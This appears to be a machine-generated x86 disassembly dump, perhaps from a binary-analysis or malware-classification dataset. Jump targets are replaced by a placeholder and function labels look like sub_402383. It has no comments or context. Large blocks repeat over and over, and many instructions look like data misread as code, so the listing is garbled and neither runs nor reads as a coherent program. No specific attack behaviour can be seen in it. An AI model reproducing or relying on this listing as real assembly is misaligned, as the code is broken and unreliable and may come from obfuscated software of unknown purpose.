ja r-xdata
jl 0xffffffffffacb21f
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
or esi 0xff24810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a7a9
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jg r-xdata
ja 0xffffffffff9ba474
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jno r-xdata
and ebx 0x870f4975
pop ecx
jne r-xdata
jbe 0xffcf4cb
jae r-xdata
xor esi 0xe681cd75
jno r-xdata
jge 0xffffffffffa0a80a
add esp 0x4
jae r-xdata
jl 0xf3a54f
jge r-xdata
jpe 0x74cd340e
pop eax
jg r-xdata
jge 0xffffffff894f7c48
add [ eax ] al
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff84289cc4
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_40231b
jne r-xdata
add esp 0x8
jg 0xf44e7aa
jae r-xdata
ja 0xffffffffa3c331b7
xchg [ esi - 0x1 ] eax
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9ba474
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79d
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402383
jb 0xffffffff81b2a039
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
add esp 0x4
jae r-xdata
jl 0xf3a54f
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
jg r-xdata
ja 0xcaa5cd
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f7c48
add [ eax ] al
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e78c
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff84289cc4
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158a7a9
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcf4cb
jno r-xdata
jge 0xffffffffffa0a80a
jge r-xdata
jpe 0x74cd340e
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402383
jne r-xdata
jne r-xdata
or ebx 0xfad7f58
adc [ ecx + 0x53 ] 0xff83e851
jg r-xdata
ja 0xcaa5cd
jno r-xdata
js 0x7f44e78c
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop edx
pop edx
jne r-xdata
or esi 0xff24810f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
jns r-xdata
sub ebx 0xe8525452
insb
jae r-xdata
and esi 0x89641273
jg r-xdata
jns 0x158a7a9
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d7
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdea79d
pop edx
jge r-xdata
jo 0xffffffff854f7cc6
add [ eax ] al
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_402383
jb 0xffffffff81b2a039
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop edx
jg r-xdata
and ecx 0xf04c483
xor al [ ecx ]
add [ eax ] al
sub eax 0x6c7315ff
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c15
jae r-xdata
and edx 0xff53830f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
and [ edx + 0xf000000 ] 0xffffff8d
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7d1
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
add esp 0x4
jg r-xdata
je 0xffffffff804f97e7
pop eax
ja r-xdata
xor edx 0x880f5e7f
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21f
jne r-xdata
sub edi 0x64244481
cwde
sub [ eax ] al
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c331b7
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jge r-xdata
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jg r-xdata
sub edi 0xf681b871
jne r-xdata
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402229
jae 0xffffffffff43aa4e
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
push edx
push esp
push edx
call sub_40221e
sub ecx 0x850f5959
das
mov edi 0xff188d0f
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jae r-xdata
mov ebp 0x478f0f5a
pop ecx
jno r-xdata
call 0xf44ea00
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jg r-xdata
ja 0xffffffffff9ba474
pop ecx
jne r-xdata
jbe 0xffcf4cb
jno r-xdata
and ebx 0x870f4975
jno r-xdata
jge 0xffffffffffa0a80a
jae r-xdata
xor esi 0xe681cd75
jge r-xdata
jpe 0x74cd340e
add esp 0x4
jae r-xdata
jl 0xf3a54f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c48
add [ eax ] al
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e5
push 0x81ffffff
out 0x77 al
jne r-xdata
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc4
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
jae r-xdata
je 0xffffffffff6da896
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d6
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4023e7
pop ecx
ja r-xdata
push esi
push esi
sub esp 0x10
call sub_4024e4
xor edi 0x810a7d58
0xf59
mov esp 0xd5e85054
add [ eax ] al
add [ ecx - 0x17adae0f ] al
dec esp
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xchg [ edi ] cl
sub_402425
jae r-xdata
pop edx
pop eax
jg r-xdata
xor ecx 0x8c0fc977
jae r-xdata
jo 0x5866199e
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
add esp 0x4
jno r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d6
push esp
push eax
call sub_4024cb
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13366
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402448
jg r-xdata
pop edx
pop edx
pop edx
jg r-xdata
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
pop eax
pop ecx
jae r-xdata
or edx 0xec830f
add [ eax ] al
xor ecx 0x8c0fc977
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jge r-xdata
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d6
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
pop eax
call [ 0xffffffffff37e857 ]
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
xor esi 0xac810f59
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
jae r-xdata
jo 0x5866199e
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
add esp 0x4
jno r-xdata
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13366
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
push esp
push eax
call sub_4024cb
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_40244b
jg r-xdata
pop eax
jge r-xdata
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
add esp 0x4
jae r-xdata
or edx 0xc7810f59
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jne r-xdata
add edx 0xfee48d0f
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d6
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
push esi
call sub_40258c
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jge r-xdata
xor esi 0xac810f59
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199e
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024cb
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jo 0xffffffffa2c13366
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402462
jne r-xdata
jae r-xdata
or ecx 0xa38d0f
add [ eax ] al
pop edx
add esp 0x4
jns 0x119aba5
jae r-xdata
call 0xffffffff854f7eb2
xor al 0xff
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd340e
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push edi
call sub_40247b
jg 0xfffffffff0b37ea2
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53a9d6
jae r-xdata
add eax 0x4c4835a
jae r-xdata
jo 0x5866199e
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
pop ecx
ja r-xdata
jge 0xffffffff9c95c153
add esp 0x4
jno r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402448
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402425
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_4024cb
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133b325
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e78
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_40244b
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13366
jl 0xffffffffc1c157a8
push edx
call sub_4023e7
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402462
jo 0xff99a4f
jo 0xffffffff894f7e8c
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_40247b
pop ecx
pop edx
ja r-xdata
